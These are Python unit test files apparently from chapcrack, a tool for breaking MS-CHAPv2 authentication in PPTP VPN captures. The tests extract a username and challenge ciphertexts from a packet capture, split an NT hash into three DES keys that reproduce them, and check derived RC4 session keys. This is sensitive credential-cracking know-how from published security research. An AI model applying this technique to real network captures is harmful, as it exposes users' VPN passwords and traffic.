        assert state.masterKey == binascii.unhexlify("FDECE3717A8C838CB388E527AE3CDD31")

        assert state.serverMasterKey == binascii.unhexlify("8B7CDC149B993A1BA118CB153F56DCCB")

        assert state.serverSessionKey == binascii.unhexlify("405CB2247A7956E6E211007AE27B22D4")

        cipher = RC4(key=state.serverSessionKey)
        assert cipher.update("test message") == binascii.unhexlify("81848317DF68846272FB5ABE")

        cipher = RC4(key=state.serverSessionKey)
        assert cipher.update(binascii.unhexlify("81848317DF68846272FB5ABE")) == "test message"
########NEW FILE########
__FILENAME__ = Parse_Test
from chapcrack.readers import ChapPacketReader
from chapcrack.state import ProtocolLogic
from chapcrack.state.MultiChapStateManager import MultiChapStateManager

__author__  = "Moxie Marlinspike"
__license__ = "GPLv3"

from passlib.hash import nthash
from passlib.utils import des
import unittest
import binascii
from chapcrack.state.ChapStateManager import ChapStateManager
from chapcrack.readers.ChapPacketReader import ChapPacketReader

class ParseTest(unittest.TestCase):

    def test_des(self):
        result = des.des_encrypt_block('12345678', 'ABCDEFGH')
        assert binascii.hexlify(result) == "96de603eaed6256f"

    def test_parsing(self):
        capture    = open("tests/pptp.cap")
        reader     = ChapPacketReader(capture)
        handshakes = MultiChapStateManager()

        for packet in reader:
            handshakes.addHandshakePacket(packet)

        complete = handshakes.getCompletedHandshakes()

        assert len(complete) == 1

        for server in complete:
            for client in complete[server]:
                c1, c2, c3 = complete[server][client].getCiphertext()
                plaintext  = complete[server][client].getPlaintext()
                username   = complete[server][client].getUserName()

                assert username == "moxie"

                hash = nthash.raw_nthash('bPCFyF2uL1p5Lg5yrKmqmY')

                print "NT Hash: %s" % binascii.hexlify(hash)

                key1 = hash[0:7]
                key1 = des.expand_des_key(key1)

                key2 = hash[7:14]
                key2 = des.expand_des_key(key2)

                key3 = hash[14:16]
                key3 += (chr(0x00) * 5)
                key3 = des.expand_des_key(key3)

                result1 = des.des_encrypt_block(key1, plaintext)
                result2 = des.des_encrypt_block(key2, plaintext)
                result3 = des.des_encrypt_block(key3, plaintext)

                print "DES Encryption 1: %s" % binascii.hexlify(result1)
                print "C1: %s" % binascii.hexlify(c1)
                print "C2: %s" % binascii.hexlify(c2)
                print "C3: %s" % binascii.hexlify(c3)

                assert result1 == c1
                assert result2 == c2
                assert result3 == c3




########NEW FILE########
